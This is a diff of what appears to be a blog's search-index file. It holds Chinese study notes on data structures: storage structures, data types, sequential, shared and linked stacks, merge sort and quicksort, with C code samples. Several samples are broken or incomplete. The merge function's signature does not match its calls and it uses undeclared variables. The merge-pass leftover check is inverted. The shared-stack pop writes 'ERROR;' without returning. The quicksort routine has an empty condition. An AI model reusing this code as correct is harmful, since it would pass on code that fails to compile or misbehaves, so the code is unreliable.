+<h1 id="结构分类"><a href="#结构分类" class="headerlink" title="结构分类"></a>结构分类</h1><h2 id="1-存储类型"><a href="#1-存储类型" class="headerlink" title="1. 存储类型"></a>1. 存储类型</h2><ol>
+<li><h3 id="逻辑结构：-面向问题-数据元素之间的关系"><a href="#逻辑结构：-面向问题-数据元素之间的关系" class="headerlink" title="逻辑结构：(面向问题)数据元素之间的关系"></a>逻辑结构：<span style="color: green;">(面向问题)</span>数据元素之间的关系</h3><ol>
+<li><h4 id="线性结构：一对一"><a href="#线性结构：一对一" class="headerlink" title="线性结构：一对一"></a>线性结构：一对一</h4></li>
+<li><h4 id="非线性结构"><a href="#非线性结构" class="headerlink" title="非线性结构"></a>非线性结构</h4><ol>
+<li>集合结构：同属一个集合，没有其他关系（一国+多民族）</li>
+<li>树形结构：一对多、层次</li>
+<li>图形结构：多对多</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><h3 id="物理结构：-面向计算机-在计算机中的存储方式"><a href="#物理结构：-面向计算机-在计算机中的存储方式" class="headerlink" title="物理结构：(面向计算机)在计算机中的存储方式"></a>物理结构：<span style="color: green;">(面向计算机)</span>在计算机中的存储方式</h3><ol>
+<li>顺序存储结构（连续地址、排队占位）：数据间的<span style="color: blue;">逻辑关系</span>和<span style="color: blue;">物理关系</span>一致</li>
+<li>链式存储结构（指针索引、任意存储）</li>
+</ol>
+</li>
+</ol>
+<h2 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2. 数据类型"></a>2. 数据类型</h2><ul>
+<li><p><span style="color: blue;">分类方式：</span> <span style="color: blue;"></p>
+<ul>
+<li>1. 取值范围</span> <span style="color: blue;"></li>
+<li>2. 所能进行的操作</span></li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><p>原子类型（不可分解的基本类型）：整型、实型、字符型</p>
+</li>
+<li><p>结构类型（可分解组合类型）：结构体</p>
+</li>
+<li><p>抽象数据类型 ADT（微元思想）：一个<span style="color: red;">数学模型</span>及定义在该模型上的一组操作</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>计算机综合</category>
+        <category>408计算机</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Stack Structures</title>
+    <url>/2021/05/29/stack-struct/</url>
+    <content><![CDATA[<h3 id="栈（LIFO结构）"><a href="#栈（LIFO结构）" class="headerlink" title="栈（LIFO结构）"></a>栈（LIFO结构）</h3><ol>
+<li><h4 id="定义：仅在表尾（栈顶top）插入-amp-删除的后进先出-x3D-x3D-线性表-x3D-x3D"><a href="#定义：仅在表尾（栈顶top）插入-amp-删除的后进先出-x3D-x3D-线性表-x3D-x3D" class="headerlink" title="定义：仅在表尾（栈顶top）插入&amp;删除的后进先出&#x3D;&#x3D;线性表&#x3D;&#x3D;"></a>定义：仅在<strong>表尾</strong>（栈顶top）插入&amp;删除的后进先出&#x3D;&#x3D;线性表&#x3D;&#x3D;</h4><ol>
+<li>特点：线性表（栈元素具有线性关系，即前驱后继关系）、有栈顶top和栈底bottom、空栈</li>
+<li>入（压）栈、出（弹）栈</li>
+<li>进出栈变化形式：有位置限制，无时间限制</li>
+<li>栈抽象数据类型（Stack）：类似线性表（P78~P79）</li>
+</ol>
+</li>
+<li><h4 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h4><ol>
+<li><p>空栈：<code>top = -1；</code>【数组元素从0开始】</p>
+</li>
+<li><p>top：栈顶指针</p>
+</li>
+<li><p>StackSize：栈长度</p>
+</li>
+<li><p>top &lt; StackSize</p>
+</li>
+<li><p>栈结构定义</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> SElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType data[MAXSIZE];    <span class="comment">//存放数据的数组</span></span><br><span class="line">    <span class="type">int</span> top;    <span class="comment">//初始化栈顶指针，一般为 int top=-1；</span></span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进栈操作Push</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 判断栈满</span></span><br><span class="line"><span class="comment">2. top++</span></span><br><span class="line"><span class="comment">3. 数据赋值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">Push</span><span class="params">(SqStack *S,SElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;top == MAXSIZE <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;    <span class="comment">//1</span></span><br><span class="line">    &#125;</span><br><span class="line">    S-&gt;top++;    <span class="comment">//2</span></span><br><span class="line">    S-&gt;data[S-&gt;top]=e;    <span class="comment">//3</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>出栈操作Pop</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 判断栈空</span></span><br><span class="line"><span class="comment">2. 取出栈顶元素e</span></span><br><span class="line"><span class="comment">3. 栈顶top--</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">Pop</span><span class="params">(SqStack *S,SElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;top == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;    <span class="comment">//1</span></span><br><span class="line">    &#125;</span><br><span class="line">    *e=S-&gt;data[S-&gt;top];    <span class="comment">//2</span></span><br><span class="line">    S-&gt;top--;    <span class="comment">//3</span></span><br><span class="line">    <span class="keyword">return</span> OK;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>共享栈（&#x3D;&#x3D;管道对接&#x3D;&#x3D;）【节约空间】</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">共享栈空间结构定义：</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType data[MAXSIZE];</span><br><span class="line">    <span class="type">int</span> top1,top2;</span><br><span class="line">&#125;SqDoubleStack;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">入栈Push：</span></span><br><span class="line"><span class="comment"> ++top1</span></span><br><span class="line"><span class="comment"> --top2</span></span><br><span class="line"><span class="comment"> 1. 判断栈满：top1 + 1==top2</span></span><br><span class="line"><span class="comment"> 2. 记录元素stackNumber判断 top1++ 或 top2--</span></span><br><span class="line"><span class="comment"> 3. 元素赋值 S-&gt;data[ ++S-&gt;top1 || --S-&gt;top2 ]=e；</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">Push</span><span class="params">(SqDoubleStack *S,SElemType e,<span class="type">int</span> stackNumber)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(S-&gt;top1+<span class="number">1</span> == S-&gt;top2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(StackNumber == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        S-&gt;data[++S-&gt;top1] = e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(stackNumber==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        S-&gt;data[--S-&gt;top2] = e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">(栈顶元素)出栈Pop：</span></span><br><span class="line"><span class="comment">    top1--</span></span><br><span class="line"><span class="comment">    top2++</span></span><br><span class="line"><span class="comment">    1.记录元素stackNumber判断top1或top2</span></span><br><span class="line"><span class="comment">    2.异常判断栈空：</span></span><br><span class="line"><span class="comment">        top1 == -1</span></span><br><span class="line"><span class="comment">        top2 == MAXSIZE</span></span><br><span class="line"><span class="comment">    3.取出栈顶元素*e=S-&gt;data[S-&gt;top1-- || S-&gt;top2++]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">Pop</span><span class="params">(SqDoubleStack *S,SElemType *e,<span class="type">int</span> stackNumber)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(stackNumber == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(S-&gt;top1==<span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ERROR;    <span class="comment">//栈1空，异常</span></span><br><span class="line">        &#125;*e=S-&gt;data[S-&gt;top1--];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(stackNumber ==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(S-&gt;top2==MAXSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">            ERROR;    <span class="comment">//栈2空，异常</span></span><br><span class="line">        &#125;*e=S-&gt;data[S-&gt;top2++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>堆栈溢出：缺乏栈满判断，持续入栈，超出MAXSIZE</p>
+</li>
+</ol>
+</li>
+<li><h4 id="链栈"><a href="#链栈" class="headerlink" title="链栈"></a>链栈</h4><ol>
+<li><p>特点：链栈不需要头结点（头指针和栈顶指针合二为一），由内存提供动态空间，不存在溢出问题，只存在系统崩溃死机问题</p>
+</li>
+<li><p>链栈结构定义</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">定义数据结点，由data+next组成</span></span><br><span class="line"><span class="comment">定义top指针，计数元素count</span></span><br><span class="line"><span class="comment">空链栈：top == NULL 时</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SElemType data;    <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span> *<span class="title">next</span>;</span>    <span class="comment">//后继</span></span><br><span class="line">&#125;StackNode,*LinkStackPtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LinkStackPtr top;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">&#125;LinkStack;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>链栈进栈操作：动态生成结点s，赋值元素e，s-&gt;next指向当前top指针指向的结点；top指向新结点s作为新栈顶；计数++</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1. 动态申请内存空间生成链栈结点</span></span><br><span class="line"><span class="comment">2. 数据域赋值</span></span><br><span class="line"><span class="comment">3. next指向当前栈顶指针top指向的结点</span></span><br><span class="line"><span class="comment">4. 成为新栈顶</span></span><br><span class="line"><span class="comment">5. 链栈count++</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">Push</span><span class="params">(LinkStack *S,SElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkStackPtr s=(LinkStackPtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(StackNode));    <span class="comment">//动态生成结点</span></span><br><span class="line">    s-&gt;data=e;</span><br><span class="line">    s-&gt;next=S-&gt;top;</span><br><span class="line">    S-&gt;top=s;</span><br><span class="line">    S-&gt;count++;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>链栈出栈操作：取出栈顶结点给变量p，指针下移，释放p</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.生成指针变量p</span></span><br><span class="line"><span class="comment">2.异常判断，栈S是否存在</span></span><br><span class="line"><span class="comment">3.取出栈顶top的数据域data</span></span><br><span class="line"><span class="comment">4.p指向top结点</span></span><br><span class="line"><span class="comment">5.top的下移一位作为新top结点</span></span><br><span class="line"><span class="comment">6.释放p指向的结点原top</span></span><br><span class="line"><span class="comment">7.计数count--</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">Pop</span><span class="params">(LinkStack *S,SElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkStackPtr p;    <span class="comment">//1</span></span><br><span class="line">    <span class="keyword">if</span>(StackEmpty(*S))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;    <span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line">    *e=S-&gt;top-&gt;data;    <span class="comment">//3</span></span><br><span class="line">    p=S-&gt;top;    <span class="comment">//4</span></span><br><span class="line">    S-&gt;top=S-&gt;top-&gt;next;    <span class="comment">//5</span></span><br><span class="line">    <span class="built_in">free</span>(p);    <span class="comment">//6</span></span><br><span class="line">    S-&gt;count--;    <span class="comment">//7</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><h4 id="栈的应用"><a href="#栈的应用" class="headerlink" title="栈的应用"></a>栈的应用</h4><ol>
+<li>递归<ol>
+<li>定义：把自己当函数调用（递归：选择结构；迭代：循环结构）（弊端：频繁调用函数，占内存）</li>
+<li>(递归)栈操作：递归调用阶段 –&gt; 压&#x2F;入栈；递归回退阶段 –&gt; 弹&#x2F;出栈</li>
+<li><span style="color: green;">实例：斐波那契数列（P86~88）</span></li>
+</ol>
+</li>
+<li>四则运算表达式求值（中缀+后缀）<ol>
+<li>括号成对出现，（遇左括号）左括号进栈，（遇右括号）将左括号出栈</li>
+<li>中缀表达式转后缀：栈用来进出运算的&#x3D;&#x3D;符号&#x3D;&#x3D;</li>
+<li>后缀表达式进行计算：栈用来进出运算的&#x3D;&#x3D;数字&#x3D;&#x3D;</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>计算机综合</category>
+        <category>408计算机</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Merge Sort</title>
+    <url>/2021/05/29/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/</url>
+    <content><![CDATA[<h3 id="（2路）归并排序（倒置的二叉树：两两合并排序后再合并）"><a href="#（2路）归并排序（倒置的二叉树：两两合并排序后再合并）" class="headerlink" title="（2路）归并排序（倒置的二叉树：两两合并排序后再合并）"></a>（2路）归并排序<span style="color: green;">（倒置的二叉树：两两合并排序后再合并）</span></h3><ol>
+<li><p>二路归并思路：<strong>n个记录看作n个序列</strong>，两两归并后<strong>得到$\lfloor n&#x2F;2 \rfloor$个长度为2或1的有序子序列</strong>，再次循环归并直到得到<strong>一条长度为n的序列</strong></p>
+</li>
+<li><p>&#x3D;&#x3D;递归&#x3D;&#x3D;思路进行归并排序<span style="color: red;">（先拆分，后归并）</span></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MSort</span><span class="params">(<span class="type">int</span> SR[] , <span class="type">int</span> TR1[] , <span class="type">int</span> s , <span class="type">int</span> t)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">int</span> TR2[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(s==t)</span><br><span class="line">    &#123;</span><br><span class="line">        TR1[s]=SR[s];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">子区间SR[i...m](下标用k存放)、子区间SR[m+1...n]（下标用j存放） ===&gt; TR[i....n]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Merge</span><span class="params">(<span class="type">int</span> SR[] , <span class="type">int</span> TR)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j,k,i;</span><br><span class="line">    <span class="comment">/*****从小到大归并入TR*****/</span></span><br><span class="line">    <span class="keyword">for</span>(j=m+<span class="number">1</span>,k=i ; i&lt;=m &amp;&amp; j&lt;=n ; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(SR[i] &lt; SR[j])</span><br><span class="line">        &#123;</span><br><span class="line">            TR[k] = SR[i++];	<span class="comment">//左SR间元素并入</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            TR[k] = SR[j++];	<span class="comment">//右SR元素并入</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/******左右子序列进行元素判断******/</span></span><br><span class="line">    <span class="keyword">if</span>(i&lt;=m)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(l=<span class="number">0</span> ; l&lt;=m-i ; l++)</span><br><span class="line">        &#123;</span><br><span class="line">            TR[k+l] = SR[i+l]；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(l=<span class="number">0</span> ; l&lt;=n-j ; l++)</span><br><span class="line">        &#123;</span><br><span class="line">            TR[k+l] = SR[j+l];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&#x3D;&#x3D;迭代&#x3D;&#x3D;思路进行归并排序</p>
+<ol>
+<li>相邻元素归并：判断序列为奇偶，奇序列需要对最后一个单元素进行处理</li>
+<li>数组复用：S数组当成T数组，T数组当成S数组</li>
+<li>合并元素数从k &#x3D; 1成倍增加（log<sub>2</sub>n）<span style="color: green;">【1、1x2、2x2、4x2…】</span></li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MergeSort2</span><span class="params">(SqList *L)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *TR=(<span class="type">int</span>*)<span class="built_in">malloc</span>(L-&gt;length * <span class="keyword">sizeof</span>(<span class="type">int</span>));	<span class="comment">//存放归并结果，动态生成归并数据空间</span></span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(k&lt;L-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        MergePass(L-&gt;r , TR , k , L-&gt;length);	</span><br><span class="line">        k=<span class="number">2</span>*k;</span><br><span class="line">        MergePass(TR , L-&gt;r , k , L-&gt;length);</span><br><span class="line">        k=<span class="number">2</span>*k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MergePass</span><span class="params">(<span class="type">int</span> SR[] , <span class="type">int</span> TR[] , <span class="type">int</span> s , <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="comment">/****调用两两归并(采用相邻两个元素归并的方式)****/</span></span><br><span class="line">    <span class="keyword">while</span>(i &lt;=  n<span class="number">-2</span>*s+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Merge(SR , TR , i ,i+s<span class="number">-1</span> , i+<span class="number">2</span>*s<span class="number">-1</span>);</span><br><span class="line">        i = i+<span class="number">2</span>*s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    if(i &lt; n-s+1)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        Merge(SR , TR , i , i+s-1 , n);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/******奇数序列，对最后一个元素进行处理*******/</span></span><br><span class="line">    <span class="keyword">if</span>(i &gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = i ; j &lt;= n ; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            TR[j] = SR[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>计算机综合</category>
+        <category>408计算机</category>
+      </categories>
+      <tags>
+        <tag>数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>交换类排序算法：快速排序</title>
     <url>/2021/05/29/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
     <content><![CDATA[<h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><ol>
@@ -3984,36 +3908,6 @@
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">QSort2</span><span class="params">(SqList *L,<span class="type">int</span> low,<span class="type">int</span> high)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pivot;</span><br><span class="line">    <span class="keyword">if</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(low &lt; high)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/**********/</span></span><br><span class="line">            <span class="comment">/**********/</span></span><br><span class="line">            low = pivot+<span class="number">1</span>;	<span class="comment">//尾递归</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        InsertSort(L);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ol>
 </li>
-</ol>
-]]></content>
-      <categories>
-        <category>计算机综合</category>
-        <category>408计算机</category>
-      </categories>
-      <tags>
-        <tag>数据结构</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Merge Sort</title>
-    <url>/2021/05/29/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/</url>
-    <content><![CDATA[<h3 id="（2路）归并排序（倒置的二叉树：两两合并排序后再合并）"><a href="#（2路）归并排序（倒置的二叉树：两两合并排序后再合并）" class="headerlink" title="（2路）归并排序（倒置的二叉树：两两合并排序后再合并）"></a>（2路）归并排序<span style="color: green;">（倒置的二叉树：两两合并排序后再合并）</span></h3><ol>
-<li><p>二路归并思路：<strong>n个记录看作n个序列</strong>，两两归并后<strong>得到$\lfloor n&#x2F;2 \rfloor$个长度为2或1的有序子序列</strong>，再次循环归并直到得到<strong>一条长度为n的序列</strong></p>
-</li>
-<li><p>&#x3D;&#x3D;递归&#x3D;&#x3D;思路进行归并排序<span style="color: red;">（先拆分，后归并）</span></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MSort</span><span class="params">(<span class="type">int</span> SR[] , <span class="type">int</span> TR1[] , <span class="type">int</span> s , <span class="type">int</span> t)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">int</span> TR2[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(s==t)</span><br><span class="line">    &#123;</span><br><span class="line">        TR1[s]=SR[s];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">子区间SR[i...m](下标用k存放)、子区间SR[m+1...n]（下标用j存放） ===&gt; TR[i....n]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Merge</span><span class="params">(<span class="type">int</span> SR[] , <span class="type">int</span> TR)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j,k,i;</span><br><span class="line">    <span class="comment">/*****从小到大归并入TR*****/</span></span><br><span class="line">    <span class="keyword">for</span>(j=m+<span class="number">1</span>,k=i ; i&lt;=m &amp;&amp; j&lt;=n ; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(SR[i] &lt; SR[j])</span><br><span class="line">        &#123;</span><br><span class="line">            TR[k] = SR[i++];	<span class="comment">//左SR间元素并入</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            TR[k] = SR[j++];	<span class="comment">//右SR元素并入</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/******左右子序列进行元素判断******/</span></span><br><span class="line">    <span class="keyword">if</span>(i&lt;=m)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(l=<span class="number">0</span> ; l&lt;=m-i ; l++)</span><br><span class="line">        &#123;</span><br><span class="line">            TR[k+l] = SR[i+l]；</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(l=<span class="number">0</span> ; l&lt;=n-j ; l++)</span><br><span class="line">        &#123;</span><br><span class="line">            TR[k+l] = SR[j+l];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>&#x3D;&#x3D;迭代&#x3D;&#x3D;思路进行归并排序</p>
-<ol>
-<li>相邻元素归并：判断序列为奇偶，奇序列需要对最后一个单元素进行处理</li>
-<li>数组复用：S数组当成T数组，T数组当成S数组</li>
-<li>合并元素数从k &#x3D; 1成倍增加（log<sub>2</sub>n）<span style="color: green;">【1、1x2、2x2、4x2…】</span></li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MergeSort2</span><span class="params">(SqList *L)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *TR=(<span class="type">int</span>*)<span class="built_in">malloc</span>(L-&gt;length * <span class="keyword">sizeof</span>(<span class="type">int</span>));	<span class="comment">//存放归并结果，动态生成归并数据空间</span></span><br><span class="line">    <span class="type">int</span> k=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(k&lt;L-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        MergePass(L-&gt;r , TR , k , L-&gt;length);	</span><br><span class="line">        k=<span class="number">2</span>*k;</span><br><span class="line">        MergePass(TR , L-&gt;r , k , L-&gt;length);</span><br><span class="line">        k=<span class="number">2</span>*k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MergePass</span><span class="params">(<span class="type">int</span> SR[] , <span class="type">int</span> TR[] , <span class="type">int</span> s , <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="comment">/****调用两两归并(采用相邻两个元素归并的方式)****/</span></span><br><span class="line">    <span class="keyword">while</span>(i &lt;=  n<span class="number">-2</span>*s+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Merge(SR , TR , i ,i+s<span class="number">-1</span> , i+<span class="number">2</span>*s<span class="number">-1</span>);</span><br><span class="line">        i = i+<span class="number">2</span>*s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    if(i &lt; n-s+1)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        Merge(SR , TR , i , i+s-1 , n);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/******奇数序列，对最后一个元素进行处理*******/</span></span><br><span class="line">    <span class="keyword">if</span>(i &gt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = i ; j &lt;= n ; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            TR[j] = SR[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ol>
 ]]></content>
       <categories>
